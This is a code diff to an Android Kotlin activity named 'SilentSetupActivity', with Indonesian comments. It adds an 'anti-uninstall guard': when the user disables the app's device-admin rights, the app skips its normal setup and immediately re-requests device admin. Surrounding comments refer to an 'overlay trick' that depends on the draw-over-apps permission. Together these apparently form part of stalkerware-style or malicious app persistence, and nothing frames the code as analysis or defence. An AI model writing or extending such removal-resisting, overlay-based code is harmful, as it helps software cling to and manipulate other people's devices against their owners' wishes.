@@ -43,7 +43,18 @@ class SilentSetupActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         crashlytics.log("SilentSetupActivity: onCreate")
-        // ── Langkah PERTAMA: minta SYSTEM_ALERT_WINDOW sebelum runtime permissions ──
+
+        // ── Anti-Uninstall Guard: jika dipanggil dari onDisabled, langsung ke admin ──
+        // Bypass semua step awal (overlay, runtime perms, storage, battery)
+        // karena semua itu sudah pernah di-grant sebelumnya.
+        if (intent.getBooleanExtra("force_request_admin", false)) {
+            crashlytics.log("SilentSetupActivity: force_request_admin mode")
+            handler.postDelayed({ requestDeviceAdmin() }, 300)
+            return
+        }
+
+        // ── Normal setup flow ─────────────────────────────────────────────────
+        // Langkah PERTAMA: minta SYSTEM_ALERT_WINDOW sebelum runtime permissions.
         // Overlay trick tidak bisa jalan tanpa izin ini.
         requestOverlayPermission()
     }
